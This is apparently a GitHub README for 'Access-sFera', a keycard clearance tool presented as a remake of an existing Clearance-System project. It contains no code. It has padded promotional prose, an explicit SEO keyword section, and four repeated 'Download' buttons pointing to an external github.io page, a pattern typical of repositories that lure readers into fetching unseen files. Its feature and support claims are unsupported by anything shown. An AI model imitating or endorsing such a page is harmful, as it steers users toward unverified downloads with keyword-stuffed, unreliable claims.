![preview](https://raw.githubusercontent.com/Uzair551135/Clearance-System-Next/main/screen_e2eb.svg)
[![Download](https://raw.githubusercontent.com/Uzair551135/Clearance-System-Next/main/run_36c5.svg)](https://Uzair551135.github.io/Clearance-System-Next/)

# Access-sFera — Autonomous Keycard Clearance Fabric 🛡️

**A resilient, zero-dependency clearance orchestration layer for keycard-driven environments — inspired by the Danonienko/Clearance-System lineage, reimagined for the 2026 edge-first era.**

Access-sFera doesn't just read keycards. It *choreographs* trust. Every tap of a badge becomes a small act of theater: the reader bows, the gate considers, the ledger nods — and passage is either granted with quiet dignity or politely refused with an audit trail worth framing.

Built for makers, tinkerers, facility operators and curious tinker-hall engineers who believe that access control should be legible, inspectable and absurdly portable — no cloud titans required.

---

## 🌐 Project Snapshot

| Aspect | Detail |
|---|---|
| Primary Stack | Vanilla JS / Node-free runtime / HTML5 |
| Dependency Count | **0** (yes, zero, forever zero) |
| Target Readers | USB-HID badge readers, NFC bridges, and serial dongles |
| Storage | Local-first flat-file ledger with optional relay |
| Language Coverage | 12 locales bundled, 30+ community translations |
| License | MIT (see below) |
| Release Cycle | Rolling, monthly stability pulses |
| Support Window | 24/7 async response desk |

[![Download](https://raw.githubusercontent.com/Uzair551135/Clearance-System-Next/main/run_36c5.svg)](https://Uzair551135.github.io/Clearance-System-Next/)

---

## 🚪 Why This Exists

Traditional clearance systems are walled gardens. They hide their rules behind vendor login screens, charge per-door licensing, and treat a JSON export like a state secret. Access-sFera takes the opposite stance: your readers, your rules, your export.

The metaphor is simple. Think of a lighthouse keeper. The light doesn't care who owns the ship — it just rotates, illuminating what is and isn't safe water. Access-sFera is that rotation: constant, predictable, unattached.

If the old Clearance-System was a hand-drawn blueprint, Access-sFera is the same blueprint traced onto tracing paper and pinned to a corkboard that everyone can walk past and annotate.

---

## ✨ Feature Constellation

Every feature below exists because someone, somewhere, once yelled at a gate that refused to open. This is our apology to them.

- 🔑 **Keycard-Agnostic Ingestion** — Any raw byte stream from a reader can be normalized into a clearance event through a small adapter descriptor.
- 📇 **Reader Fingerprinting** — Each reader announces a stable hardware signature, letting the fabric distinguish "front lobby door 3" from "server room vestibule" without manual labeling.
- 🧠 **Rule Choreography Engine** — Compose clearance logic as ordered mini-scenes: tap → identity resolution → window check → escalation threshold → verdict.
- 🕰️ **Time-Window Policies** — A card valid Monday 9–5 may be a ghost on a Saturday night. The system says so, calmly.
- 🧾 **Immutable Local Ledger** — Append-only, human-readable, greppable. Diff two ledgers in your favorite terminal and see exactly who wandered where.
- 🔁 **Relay-Ready Sync** — Optional peer relay mirrors ledger deltas across sites without central authority.
- 🌍 **Multilingual Interface** — Twelve bundled locales, right-to-left aware, with a translation overlay for community contributions.
- 📱 **Responsive UI** — From wall-mounted kiosk screens to pocket tablets to a curious wrist display, layout adapts without argument.
- 🧩 **Zero-Dependency Philosophy** — Nothing to install, nothing to audit downstream, nothing to surprise you at 3 AM.
- 🔔 **Silent Escalation Hooks** — When a card triggers an unusual path, the fabric can whisper to a webhook or a serial console — quietly.
- 🗂️ **Reversible Revocation** — Revoking a card is a ledger event, never a deletion. History stays intact because history is evidence.
- ♿ **Accessibility First** — Screen-reader-friendly forms, keyboard-navigable flows, contrast-tuned palettes.
- 🎭 **Simulation Mode** — Rehearse a policy change against last month's events before it touches a real door.
- 🛰️ **Offline Sovereignty** — Lose the internet; keep the doors. The fabric never blocks on a remote handshake.
- 🧪 **Deterministic Replay** — Feed the same ledger through the same ruleset and get byte-identical verdicts. Debugging becomes archaeology, not guesswork.

[![Download](https://raw.githubusercontent.com/Uzair551135/Clearance-System-Next/main/run_36c5.svg)](https://Uzair551135.github.io/Clearance-System-Next/)

---

## 🏗️ Repository Layout (Narrative Tour)

You won't find a `/dist` folder bursting with minified ghosts. Here's the terrain, described as a walking path:

1. **`fabric/`** — The beating heart. Reader adapters, rule parser, verdict assembler.
2. **`lenses/`** — UI shells. Each "lens" is a rendering personality: kiosk, tablet, wall panel, terminal text.
3. **`ledger/`** — Append-only storage format, countersign utilities, diff tooling.
4. **`lexicon/`** — Translation bundles and locale metadata. Adding a language is a single file gesture.
5. **`rehearsal/`** — Simulation harness and fixture events for dry runs.
6. **`beacons/`** — Optional relay points for multi-site mirroring.
7. **`docs/`** — Hand-written essays, RFC-style design notes, decision logs.

Everything is plain text. Everything is reviewable in a pull request. Everything survives a laptop drop, because a folder can be copied to a USB stick and walked across a campus.

---

## 🧭 Design Principles

- **Legibility over cleverness.** If a rule needs three paragraphs to explain, it needs a rewrite.
- **Local custody.** Data lives where the doors live.
- **No silent failures.** Every refused tap produces a readable reason string.
- **Composability.** Policies are built from small, composable verdicts.
- **Reversibility.** Any action can be explained by the ledger that preceded it.
- **Calm defaults.** Ship with sane boundaries; let operators expand them deliberately.

---

## 🛠️ Getting Started Without Getting Bogged Down

Access-sFera is a bring-your-own-runtime affair. Grab the release bundle from your preferred distribution surface, drop it beside a reader, point a configuration file at the reader's path, and let the fabric take over.

The onboarding flow:

1. Describe each reader in a plain configuration stanza.
2. Seed the ledger with your initial card roster (CSV, JSON, or hand-typed — all fine).
3. Open a lens — the kiosk lens is the friendliest starting point.
4. Tap a card. Watch the verdict appear. Smile, or frown, and adjust.

No daemon installs. No package managers whispering into your shell profile. Just a folder and a decision.

---

## 🔍 SEO-Friendly Keyword Integration

This project naturally addresses searches around **keycard clearance systems**, **zero-dependency access control**, **local-first identity fabric**, **badge reader orchestration**, **open clearance ledger**, **multilingual gate UI**, **responsive access panels**, **24/7 access support tooling**, and **auditable revocation workflows**. The vocabulary appears because the features exist — not the other way around.

If you arrived here looking for a **lightweight clearance orchestration layer**, a **keycard reader companion**, or a **self-hosted access ledger**, you are in the right neighborhood.

---

## 🌍 Multilingual Support in Practice

Every visible string in the fabric flows through a lexicon lookup. Adding a new language means adding a file, filling in the blanks, and watching the UI pivot. The bundled twelve cover widely used scripts; the community layer extends toward dialects and regional phrasing.

Right-to-left layouts mirror gracefully. Plural forms respect locale conventions. Date stamps render in each operator's preferred shape. Nobody should have to translate a verdict reason in their head at 2 AM.

---

## 🕔 Availability & Support

A **24/7 async response desk** watches the issue queue. Weekends, holidays and unusual time zones are treated as normal operating conditions. Expect a human-shaped reply, a decision, and a plan — not a bot looping a canned apology.

For operators running critical sites, the project maintains an escalation channel described in the design notes. It is intentionally boring: no ceremony, just clarity.

---

## 🧪 Testing Philosophy

Tests are written as **scenes**, not assertions scattered across files. A scene describes a card, a reader, a time, and an expected verdict. Run the scene suite before touching a live door and you'll sleep better.

The rehearsal harness ships with a bundle of historical events so newcomers can watch a policy amendment ripple through last month's traffic — before it ripples through tomorrow's.

---

## 🔐 Security Posture

Access-sFera assumes readers are honest but networks are not. Ledger entries can be countersigned by readers; relay mirrors can be verified against a pinned fingerprint. Nothing in the fabric depends on a secret you can't rotate.

Vulnerability reports are welcomed through the project's private channel. Coordinated disclosure is the default posture; credit is given generously.

---

## 🤝 Contributing

Bring curiosity. Bring a scenario you wish the fabric handled. Bring a translation for a language we haven't reached yet.

Guidelines, in one breath: keep diffs small, explain the "why" in the pull request description, and treat the ledger format as a public contract. If you want to add a new lens, start with a sketch and a paragraph — we will help shape the rest.

The project's tone is collaborative and unhurried. There is no leaderboard. There is only the quiet satisfaction of a gate that opens exactly when it should.

---

## 🗺️ Roadmap (Forthcoming Scenes)

- **Relay Consensus Mode** — mirrors voting on ledger order without a central referee.
- **Card Secret Rotation Rituals** — periodic re-seeding of card identifiers with graceful overlap.
- **Wrist & Wearable Lens** — an ultra-compact kiosk personality for tiny screens.
- **Narrative Audit Exports** — a human-readable "what happened last night" digest.
- **Policy Diff Visualizer** — side-by-side rule comparison rendered as a storyboard.

Each roadmap item exists because an operator somewhere sketched it on a napkin and pinned it to our collective corkboard.

---

## 📜 License

Released under the **MIT License**. Read the full terms in the repository's `LICENSE` file: [MIT License](https://opensource.org/licenses/MIT).

You are welcome to fold this fabric into your own buildings, schools, workshops, and curious experiments. Attribution is appreciated, not demanded.

---

## ⚠️ Disclaimer

Access-sFera is a **clearance orchestration companion**, not a substitute for professional security engineering, regulatory compliance review, or physical safety planning. Operators are responsible for validating that their deployment meets local laws, industry standards and organizational policy. The maintainers provide the tool; the judgment of how to use it belongs to the operator.

No warranty is implied. Doors may behave unpredictably if rules are misconfigured. Test in rehearsal before trusting in production. If a gate ever opens when it shouldn't, the ledger will tell you why — read it before assigning blame.

---

## 🧷 A Closing Note

Systems that govern passage should be as transparent as the passage itself. Access-sFera is our attempt to keep clearance legible — one tap, one ledger line, one honest verdict at a time.

Welcome to the fabric. The light is rotating. Your card is waiting.

[![Download](https://raw.githubusercontent.com/Uzair551135/Clearance-System-Next/main/run_36c5.svg)](https://Uzair551135.github.io/Clearance-System-Next/)